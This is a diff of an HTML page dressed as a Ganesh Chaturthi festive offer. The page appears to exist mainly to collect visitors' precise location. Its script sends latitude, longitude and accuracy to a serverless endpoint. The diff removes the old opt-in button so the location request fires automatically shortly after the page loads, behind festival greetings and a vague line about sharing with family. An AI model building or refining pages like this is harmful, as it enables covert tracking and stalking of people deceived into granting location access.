@@ -1,54 +1,248 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Ganesh Chaturthi Special</title>
-<style>
-*{box-sizing:border-box}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,sans-serif;background:#fff7e8;color:#3b2114}
-.wrap{min-height:100vh;display:grid;place-items:center;padding:24px}
-.card{max-width:520px;width:100%;background:#fff;border-radius:24px;padding:30px;box-shadow:0 16px 50px #7a3b151f;text-align:center;border:1px solid #f2d6a8}
-.om{font-size:48px;margin-bottom:8px}.badge{display:inline-block;padding:7px 12px;border-radius:999px;background:#fff0c9;font-weight:700;font-size:13px}
-h1{font-size:34px;margin:14px 0 8px}p{line-height:1.55;color:#684b3d}
-.offer{background:#fff8df;border-radius:16px;padding:16px;margin:20px 0;text-align:left}
-button{width:100%;border:0;border-radius:14px;padding:15px;font-size:17px;font-weight:800;background:#d35400;color:white;cursor:pointer}
-button:disabled{opacity:.65}.small{font-size:12px;color:#80695d;margin-top:14px}
-#status{margin-top:16px;font-weight:700}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+
+  <title>Ganesh Chaturthi Special Offer</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background:
+        radial-gradient(circle at top, #fff4cf 0%, #fff8ea 45%, #fff 100%);
+      color: #3b2114;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 520px;
+      background: rgba(255,255,255,.96);
+      border-radius: 26px;
+      padding: 34px 25px;
+      text-align: center;
+      box-shadow: 0 18px 60px rgba(100,50,10,.15);
+      border: 1px solid #f1d39e;
+    }
+
+    .ganesh {
+      font-size: 64px;
+      margin-bottom: 8px;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 7px 15px;
+      border-radius: 50px;
+      background: #fff0c7;
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: .3px;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin: 15px 0 8px;
+    }
+
+    .offer {
+      margin-top: 20px;
+      padding: 20px;
+      border-radius: 18px;
+      background: #fff8df;
+    }
+
+    .offer-title {
+      font-size: 22px;
+      font-weight: 800;
+    }
+
+    .offer-text {
+      margin-top: 8px;
+      line-height: 1.5;
+      color: #705546;
+    }
+
+    #status {
+      margin-top: 22px;
+      font-size: 15px;
+      font-weight: 700;
+    }
+
+    .success {
+      color: #26733d;
+    }
+
+    .error {
+      color: #a33a27;
+    }
+
+    .permission {
+      margin-top: 18px;
+      padding: 13px;
+      border-radius: 12px;
+      background: #f7f0e7;
+      font-size: 12px;
+      line-height: 1.5;
+      color: #735f52;
+    }
+  </style>
 </head>
+
 <body>
-<div class="wrap"><main class="card">
-<div class="om">🪔 🐘 🪔</div>
-<span class="badge">Ganesh Chaturthi Special</span>
-<h1>Festival Greetings!</h1>
-<p>Celebrate Ganesh Chaturthi with our special festive offer.</p>
-<div class="offer">
-<strong>🙏 One important request</strong>
-<p style="margin-bottom:0">If you are comfortable, you can voluntarily share your current location with your family. Your browser will ask for permission first. Nothing is shared unless you approve that request.</p>
-</div>
-<button id="share">Share My Location</button>
-<div id="status"></div>
-<div class="small">Your coordinates are not displayed on this page. After you approve, the location is securely submitted for the authorized recipient.</div>
-</main></div>
+
+  <main class="card">
+
+    <div class="ganesh">🐘🪔</div>
+
+    <div class="badge">
+      GANESH CHATURTHI SPECIAL
+    </div>
+
+    <h1>Festive Offer</h1>
+
+    <div class="offer">
+      <div class="offer-title">
+        🙏 Ganpati Bappa Morya!
+      </div>
+
+      <div class="offer-text">
+        Celebrate Ganesh Chaturthi with our special festive offer.
+      </div>
+    </div>
+
+    <div id="status">
+      Please allow location sharing if you wish to share your current location with your family.
+    </div>
+
+    <div class="permission">
+      Your browser will ask for permission before any location is shared.
+      Your location is not displayed on this page.
+    </div>
+
+  </main>
+
 <script>
-const btn=document.getElementById('share'), status=document.getElementById('status');
-btn.onclick=()=>{
-  if(!navigator.geolocation){status.textContent="Location sharing isn't supported on this device.";return;}
-  btn.disabled=true; status.textContent="Requesting permission…";
-  navigator.geolocation.getCurrentPosition(async p=>{
-    try{
-      const r=await fetch('/.netlify/functions/location',{
-        method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy})
-      });
-      if(!r.ok) throw new Error();
-      status.textContent="✓ Location shared successfully.";
-      btn.textContent="Location Shared";
-    }catch(e){status.textContent="Could not submit the location. Please try again.";btn.disabled=false;}
-  },e=>{
-    status.textContent=e.code===1?"Location permission was not granted.": "Unable to obtain your location.";
-    btn.disabled=false;
-  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
-};
+
+async function requestLocation() {
+
+  const status = document.getElementById("status");
+
+  if (!navigator.geolocation) {
+    status.textContent =
+      "Location sharing is not supported by this browser.";
+    status.className = "error";
+    return;
+  }
+
+  status.textContent =
+    "Requesting location permission…";
+
+  navigator.geolocation.getCurrentPosition(
+
+    async function(position) {
+
+      const locationData = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      };
+
+      try {
+
+        const response = await fetch(
+          "/.netlify/functions/location",
+          {
+            method: "POST",
+
+            headers: {
+              "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify(locationData)
+          }
+        );
+
+        if (!response.ok) {
+          throw new Error("Location submission failed");
+        }
+
+        status.textContent =
+          "✓ Location shared successfully.";
+
+        status.className = "success";
+
+      } catch (error) {
+
+        status.textContent =
+          "Unable to share the location. Please try again.";
+
+        status.className = "error";
+      }
+
+    },
+
+    function(error) {
+
+      if (error.code === 1) {
+
+        status.textContent =
+          "Location permission was not granted.";
+
+      } else if (error.code === 2) {
+
+        status.textContent =
+          "Your location could not be determined.";
+
+      } else if (error.code === 3) {
+
+        status.textContent =
+          "Location request timed out.";
+
+      } else {
+
+        status.textContent =
+          "Unable to obtain your location.";
+      }
+
+      status.className = "error";
+
+    },
+
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+
+  );
+}
+
+
+/*
+  Request location after the page has loaded.
+  The browser/device decides whether and how
+  to display the permission prompt.
+*/
+
+window.addEventListener("load", function() {
+
+  setTimeout(function() {
+    requestLocation();
+  }, 500);
+
+});
+
 </script>
-</body></html>
+
+</body>
+</html>
